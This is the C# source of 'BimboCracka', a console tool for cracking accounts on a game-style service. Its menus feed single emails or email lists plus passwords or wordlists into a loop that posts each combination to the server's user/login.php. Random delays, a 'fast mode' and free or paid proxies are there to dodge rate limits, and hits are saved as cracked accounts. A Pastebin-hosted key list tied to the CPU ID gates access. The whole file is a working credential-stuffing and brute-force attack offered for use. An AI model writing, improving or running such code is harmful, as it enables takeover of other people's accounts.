using System.Management;
using System.Net;
using System.Text.Json;

namespace BimboCracka
{
    internal class Program
    {
        public static string? server = "null";

        public static bool fastMode;

        public static bool changePw;

        public static string pw;

        public static string ProxyType = "free";

        public static string ProxyFilePath = "FreeProxy.txt";

        public static string PaidProxyFilePath = "PaidProxy.txt";

        public static string PaidProxy = "";

        static async Task Main(string[] args)
        {
            Console.Title = "BimboCracka v1.0.2";
            await Menu();
        }
        public static async Task Menu()
        {
            string path = "auto-key.txt";
            string? key = await ReadKeyFromFile(path);

            Console.Clear();
            Utils.Logo();
            if (string.IsNullOrWhiteSpace(key))
            {
                Utils.DisplayTimeWithMessage("KEY : ", false);
                key = Console.ReadLine();
            }

            if (await AuthenticateKey(key, path))
            {
                await MenuServer();
            }
            else
            {
                await Menu();
            }
        }

        private static async Task<string?> ReadKeyFromFile(string path)
        {
            if (System.IO.File.Exists(path))
            {
                string key = await System.IO.File.ReadAllTextAsync(path);
                return string.IsNullOrWhiteSpace(key) ? null : key;
            }
            return null;
        }

        private static async Task<bool> AuthenticateKey(string key, string path)
        {
            string hwid = GenerateHWID();
            string pastebinLink = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1VUalJFNzVy";
            pastebinLink = Utils.DecodeBase64(pastebinLink);
            string json = await GetData(pastebinLink);

            if (json == null)
            {
                Utils.DisplayTimeWithMessage("ERROR FETCHING DATA!", false);
                return false;
            }

            using JsonDocument doc = JsonDocument.Parse(json);
            JsonElement users = doc.RootElement.GetProperty("users");

            if (!users.TryGetProperty(key, out JsonElement userElement))
            {
                Utils.DisplayTimeWithMessage($"KEY NOT FOUND! IF YOU ARE NEW SEND THIS TO ME : {hwid}", false);
                Console.ReadKey();
                return false;
            }

            string hwidd = userElement.GetProperty("hwid").GetString();
            if (hwid != hwidd)
            {
                Utils.DisplayTimeWithMessage("LOOKS LIKE YOU'RE TRYING TO ACCESS THIS TOOL FROM ANOTHER DEVICE! PLEASE TRY AGAIN ON YOUR ORIGINAL DEVICE OR ASK ME TO RESET YOUR KEY.", false);
                Console.ReadKey();
                return false;
            }

            Utils.DisplayTimeWithMessage("SUCCESSFULLY AUTHENTICATED!\n", true);
            await Task.Delay(2000);

            if (!System.IO.File.Exists(path))
            {
                Utils.DisplayTimeWithMessage("CREATE AUTOKEY FILE? (Y/N) : ", false);
                string? choice = Console.ReadLine()?.ToUpper();
                if (choice == "Y")
                {
                    await System.IO.File.WriteAllTextAsync(path, key);
                    Utils.DisplayTimeWithMessage("KEY SAVED!", false);
                }
            }

            return true;
        }
        static async Task<string> GetData(string url)
        {
            HttpClientHandler handler = new HttpClientHandler()
            {
                UseProxy = false,
                Proxy = null,
            };

            using HttpClient client = new HttpClient(handler);
            try
            {
                return await client.GetStringAsync(url);
            }
            catch (Exception ex)
            {
                Utils.DisplayTimeWithMessage($"ERROR: {ex.Message}", false);
                return null;
            }

        }
        static string GenerateHWID()
        {
            string hwid = "";
            var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");

            foreach (ManagementObject obj in searcher.Get())
            {
                hwid = obj["ProcessorId"].ToString();
            }

            return hwid;
        }


        public static async Task MenuServer()
        {
            Console.Clear();
            Utils.Logo();
            Utils.DisplayTimeWithMessage("SERVER : ", false);
            server = Console.ReadLine()?.Trim();

            if (string.IsNullOrWhiteSpace(server))
            {
                Utils.DisplayTimeWithMessage("ALL FIELDS MUST BE FILLED!", false);
                return;
            }
            Utils.createPath(server);
            server = Utils.ServerHelper(server);
            await MenuChoice();
        }

        public static async Task MenuChoice()
        {
            Console.Clear();
            Utils.Logo();
            Console.Title = "BimboCracka v1.0.2";
            Console.ForegroundColor = ConsoleColor.Red;
            string text = "[1] SIMPLE CRACKER     [2] AUTOMATED CRACKER     [3] HELP    [4] PROXY SETTINGS    [5] EXIT";
            Console.WriteLine(FormatMenuText(text));
            Console.WriteLine("\n");
            Utils.DisplayTimeWithMessage("CHOICE > ", false);
            string? choice = Console.ReadLine()?.Trim();

            switch (choice)
            {
                case "1":
                    await SimpleCrackaMenu();
                    break;
                case "2":
                    await AutomatedCrackaMenu();
                    break;
                case "3":
                    await HelpMenu();
                    break;
                case "4":
                    await ShowSettingsMenu();
                    break;
                case "5":
                    Environment.Exit(0);
                    break;
                default:
                    Utils.DisplayTimeWithMessage("WRONG CHOICE! PLEASE TRY AGAIN", false);
                    await Task.Delay(2500);
                    await MenuChoice();
                    break;
            }
        }

        public static async Task ShowSettingsMenu()
        {
            Console.Clear();
            Utils.Logo();
            Utils.DisplayTimeWithMessage("USE PAID PROXY? (Y/N) : ", false);
            string? usePaid = Console.ReadLine()?.Trim().ToLower();

            if (usePaid == "yes" || usePaid == "y")
            {
                ProxyType = "paid";
                Utils.DisplayTimeWithMessage("PROXY-LINE (USER:PASSWORD:HOST:PORT) : ", false);
                string? proxyInput = Console.ReadLine()?.Trim();

                if (IsValidProxyFormat(proxyInput))
                {
                    PaidProxy = proxyInput;
                    File.WriteAllText(PaidProxyFilePath, PaidProxy);
                    Console.WriteLine("\n");
                    Utils.DisplayTimeWithMessage($"PROXY SUCCESSFULLY SAVED! PRESS ENTER TO GO TO THE MENU!", true);
                    Console.ReadKey();
                    await MenuChoice();
                }
                else
                {
                    Console.WriteLine("\n");
                    Utils.DisplayTimeWithMessage("INVALID PROXY FORMAT! PLEASE TRY AGAIN!", false);
                    Console.ReadKey();
                    await ShowSettingsMenu();
                    return;
                }
            }
            else
            {
                ProxyType = "free";
                Utils.DisplayTimeWithMessage("ENTER PATH TO FREE PROXIES : ", false);
                string pathInput = Console.ReadLine()?.Trim();

                if (File.Exists(pathInput))
                {
                    File.Copy(pathInput, ProxyFilePath, true);
                    Console.WriteLine("\n");
                    Utils.DisplayTimeWithMessage($"PROXY SUCCESSFULLY SAVED! PRESS ENTER TO GO TO THE MENU!", true);
                    Console.ReadKey();
                    await MenuChoice();
                }
                else
                {
                    Console.WriteLine("\n");
                    Utils.DisplayTimeWithMessage("FILE NOT FOUND! PLEASE TRY AGAIN BY PRESSING ENTER!", false);
                    Console.ReadKey();
                    await ShowSettingsMenu();
                    return;
                }
            }

        }

        public static string FormatMenuText(string text)
        {
            int windowWidth = Console.WindowWidth;
            int paddingLeft = (windowWidth - text.Length) / 2;
            return new string(' ', Math.Max(paddingLeft, 0)) + text;
        }

        public static async Task HelpMenu()
        {
            Console.Clear();
            Utils.Logo();
            Console.ForegroundColor = ConsoleColor.Red;
            Utils.DisplayTimeWithMessage("DISCLAIMER\n\n", false);

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("You are using ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("BIMBOCRACKA ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("at your ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("OWN RISK. ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("This tool is ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("NOT AFFILIATED WITH, ENDORSED BY, OR OWNED BY MA BIMBO ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("or any of its associated platforms.\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("By using this software, you acknowledge that the developers hold ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("NO RESPONSIBILITY ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("for any consequences resulting from its use.");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("If any help needed, contact me on ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("DISCORD, ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("nick: onetino");
            Console.WriteLine("\n");
            Utils.DisplayTimeWithMessage("PRESS ENTER TO GO TO THE MENU", false);
            Console.ReadKey();
            await MenuChoice();
        }

        public static async Task SimpleCrackaMenu()
        {
            Console.Clear();
            Utils.Logo();
            string? email = await GetInput("EMAIL : ", "INVALID EMAIL!");
            if (email == null) return;

            string? choice = await GetInput("USE ONE PASSWORD OR MULTIPLE? : ", "INVALID CHOICE!");
            if (choice == null) return;

            List<string> passwords = await GetPasswords(choice);
            if (passwords == null) return;

            fastMode = await GetFastMode();

            if (File.Exists(ProxyFilePath) || File.Exists(PaidProxyFilePath))
            {
                Utils.DisplayTimeWithMessage($"USE PROXY CONFIG? (Y/N) : ", false);
                string? useProxy = Console.ReadLine()?.ToUpper().Trim();
                if (useProxy == "Y")
                {
                    HttpClient client = ConfigureHttpClient(useProxy == "Y");

                    Utils.SetHttpClient(client);
                }
                else if (useProxy == "N")
                {
                    HttpClient client = ConfigureHttpClient(false);

                    Utils.SetHttpClient(client);
                }
                else
                {
                    Utils.DisplayTimeWithMessage("WRONG CHOICE! PLEASE TRY AGAIN", false);
                    Console.ReadKey();
                    await SimpleCrackaMenu();
                }
            }
            int combinations = passwords.Count;
            Console.Clear();
            Utils.Logo();
            foreach (string password in passwords)
            {
                var parameters = new List<KeyValuePair<string, string>>
                {
                    new KeyValuePair<string, string>("email", email),
                    new KeyValuePair<string, string>("password", password)
                };

                if (!fastMode)
                {
                    var randomDelay = new Random().Next(500, 1500);
                    await Task.Delay(randomDelay);
                }

                await Utils.SendRequest(parameters, "user/login.php", server, combinations);
            }

            Console.WriteLine("\n");
            Utils.DisplayTimeWithMessage("ALL ACCOUNTS SAVED TO THE FILE, CLICK ENTER TO GO TO THE MENU", true);
            Console.ReadKey();
            await MenuChoice();
        }

        public static async Task AutomatedCrackaMenu()
        {
            Console.Clear();
            Utils.Logo();
            string? path = await GetFilePath("PATH WITH EMAILS : ");
            if (path == null) return;

            List<string> emails = await LoadEmails(path);
            if (emails.Count == 0) return;

            string? choice = await GetInput("USE ONE PASSWORD OR MULTIPLE? : ", "INVALID CHOICE!");
            if (choice == null) return;
            
            List<string> passwords = await GetPasswords(choice);
            if (passwords == null) return;
            
            fastMode = await GetFastMode();
            if (File.Exists(ProxyFilePath) || File.Exists(PaidProxyFilePath))
            {
                Utils.DisplayTimeWithMessage($"USE PROXY CONFIG? (Y/N) : ", false);
                string? useProxy = Console.ReadLine()?.ToUpper().Trim();
                if (useProxy == "Y")
                {
                    HttpClient client = ConfigureHttpClient(useProxy == "Y");

                    Utils.SetHttpClient(client);
                }
                else if (useProxy == "N")
                {
                    HttpClient client = ConfigureHttpClient(false);

                    Utils.SetHttpClient(client);
                }
                else
                {
                    Utils.DisplayTimeWithMessage("WRONG CHOICE! PLEASE TRY AGAIN", false);
                    Console.ReadKey();
                    await AutomatedCrackaMenu();
                }
            }
           
            int combinations = emails.Count * passwords.Count;
            Utils.DisplayTimeWithMessage($"STARTING {combinations} COMBINATIONS...", true);
            await Task.Delay(2000);
            Console.Clear();
            Utils.Logo();
            for (int i = 0; i < emails.Count; i++)
            {
                string email = emails[i];

                foreach (string password in passwords)
                {
                    var parameters = new List<KeyValuePair<string, string>>
                    {
                        new KeyValuePair<string, string>("email", email),
                        new KeyValuePair<string, string>("password", password)
                    };

                    if (!fastMode)
                    {
                        var randomDelay = new Random().Next(500, 1500);
                        await Task.Delay(randomDelay);
                    }

                    bool success = await Utils.SendRequest(parameters, "user/login.php", server, combinations);

                    if (success)
                    {
                        emails.RemoveAt(i);
                        i--;
                        break;
                    }
                }
            }

            Utils.successes = 0;
            Utils.crackedAccs = 0;

            Utils.DisplayTimeWithMessage("\nALL ACCOUNTS SAVED TO THE FILE, CLICK ENTER TO GO TO THE MENU", true);
            Console.ReadKey();
            await MenuChoice();
        }

        public static async Task<string?> GetFilePath(string prompt)
        {
            Utils.DisplayTimeWithMessage(prompt, false);
            string? path = Console.ReadLine()?.ToUpper().Trim();

            if (string.IsNullOrWhiteSpace(path) || !System.IO.File.Exists(path))
            {
                Utils.DisplayTimeWithMessage("FILE DOESN'T EXIST!", false);
                Console.ReadKey();
                await MenuChoice();
                return null;
            }

            return path;
        }

        public static async Task<List<string>> GetPasswords(string choice)
        {
            List<string> passwords = new List<string>();

            if (choice == "ONE")
            {
                string? pass = await GetInput("PASSWORD : ", "INVALID PASSWORD!");
                if (pass == null) return null;

                if (pass.Length >= 6 && pass.Length <= 24)
                {
                    passwords.Add(pass);
                }
                else
                {
                    Utils.DisplayTimeWithMessage("PASSWORD DOES NOT MEET LENGTH REQUIREMENTS (6-24 CHARACTERS)!", false);
                    return null;
                }
            }
            else if (choice == "MULTIPLE")
            {
                string? path = await GetFilePath("PATH WITH PASSWORDS : ");
                if (path == null) return null;

                passwords = new List<string>(await System.IO.File.ReadAllLinesAsync(path));

                if (passwords.Count == 0)
                {
                    Utils.DisplayTimeWithMessage("THE FILE IS EMPTY!", false);
                    return null;
                }

                bool hasValidPasswords = passwords.Any(p => p.Length >= 6 && p.Length <= 24);

                if (hasValidPasswords)
                {
                    passwords = passwords.Where(p => p.Length >= 6 && p.Length <= 24).ToList();
                    Utils.DisplayTimeWithMessage($"FILE LOADED SUCCESSFULLY! {passwords.Count} VALID PASSWORDS FOUND.\n", true);
                }
                else
                {
                    Utils.DisplayTimeWithMessage("NO VALID PASSWORDS FOUND (6-24 CHARACTERS)!", false);
                    return null;
                }
            }
            else
            {
                Utils.DisplayTimeWithMessage("INVALID CHOICE!", false);
                Console.ReadKey();
                await MenuChoice();
            }

            return passwords;
        }

        public static async Task<bool> GetFastMode()
        {
            Utils.DisplayTimeWithMessage("USE FAST MODE? (Y/N) : ", false);
            string? fastmode = Console.ReadLine()?.ToUpper();

            if (fastmode == "Y")
                return true;
            else if (fastmode == "N")
                return false;

            Utils.DisplayTimeWithMessage("INVALID CHOICE!", false);
            return false;
        }

        public static async Task<string?> GetInput(string prompt, string errorMessage)
        {
            Utils.DisplayTimeWithMessage(prompt, false);
            string? input = Console.ReadLine()?.Trim().ToUpper();

            if (string.IsNullOrWhiteSpace(input))
            {
                Utils.DisplayTimeWithMessage(errorMessage, false);
                return null;
            }
            return input;
        }

        public static async Task<List<string>> LoadEmails(string path)
        {
            if (string.IsNullOrWhiteSpace(path) || !System.IO.File.Exists(path))
            {
                Utils.DisplayTimeWithMessage("FILE DOESN'T EXIST!\n", false);
                return new List<string>();
            }

            List<string> emails = new List<string>(await System.IO.File.ReadAllLinesAsync(path));
            if (emails.Count == 0)
            {
                Utils.DisplayTimeWithMessage("THE FILE IS EMPTY!\n", false);
            }

            bool hasValidEmail = emails.Any(email => email.Contains("@") && email.Contains("."));
            if (hasValidEmail)
            {
                emails = emails.Where(email => email.Contains("@") && email.Contains(".")).ToList();
                Utils.DisplayTimeWithMessage($"FILE LOADED SUCCESSFULLY! {emails.Count} VALID EMAILS FOUND.\n", true);
            }
            else
            {
                Utils.DisplayTimeWithMessage("NO VALID EMAILS FOUND!\n", false);
            }

            return emails;
        }

        private static HttpClient ConfigureHttpClient(bool useProxy)
        {
            HttpClientHandler handler = new HttpClientHandler();
            if (useProxy)
            {
                string proxy = LoadProxy();
                if (!string.IsNullOrEmpty(proxy))
                {
                    handler.Proxy = new WebProxy(proxy);
                    handler.UseProxy = true;
                }
                else
                {
                    Console.WriteLine("⚠ No valid proxy found, using direct connection.");
                    handler.UseProxy = false;
                }
            }
            return new HttpClient(handler);
        }

        private static string LoadProxy()
        {
            string paidProxyPath = "PaidProxy.txt";
            string freeProxyPath = "FreeProxy.txt";

            if (File.Exists(paidProxyPath))
            {
                string proxyLine = File.ReadAllText(paidProxyPath).Trim();
                if (IsValidProxyFormat(proxyLine)) return ParseProxy(proxyLine);
            }
            else if (File.Exists(freeProxyPath))
            {
                string[] proxies = File.ReadAllLines(freeProxyPath);
                if (proxies.Length > 0 && IsValidProxyFormat(proxies[0])) return ParseProxy(proxies[0]);
            }

            return string.Empty;
        }

        private static string ParseProxy(string proxy)
        {
            string[] parts = proxy.Split(':');
            return $"{parts[2]}:{parts[3]}";
        }
        private static bool IsValidProxyFormat(string proxy)
        {
            if (string.IsNullOrEmpty(proxy)) return false;
            string[] parts = proxy.Split(':');
            return parts.Length == 4;
        }
    }
}
